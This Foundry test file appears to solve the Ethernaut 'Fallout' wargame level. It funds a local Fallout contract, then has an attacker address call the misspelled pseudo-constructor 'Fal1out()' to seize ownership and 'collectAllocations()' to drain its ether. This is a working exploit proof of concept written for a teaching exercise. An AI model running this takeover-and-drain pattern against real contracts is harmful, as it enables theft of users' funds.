// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../src/Fallout.sol";

contract FalloutTest is Test {
    function setUp() public {

    }

    function testAttack() public {
        Fallout f = new Fallout();
        deal(address(f), 1000 ether);
        address payable attacker = payable(address(0x123));
        vm.deal(attacker, 1000 ether);
        require(address(f).balance == 1000 ether);
        require(attacker.balance > 0 ether);
        vm.startPrank(attacker);
        f.Fal1out();
        f.collectAllocations();
        vm.stopPrank();
        require(address(f).balance == 0 ether);
    }
}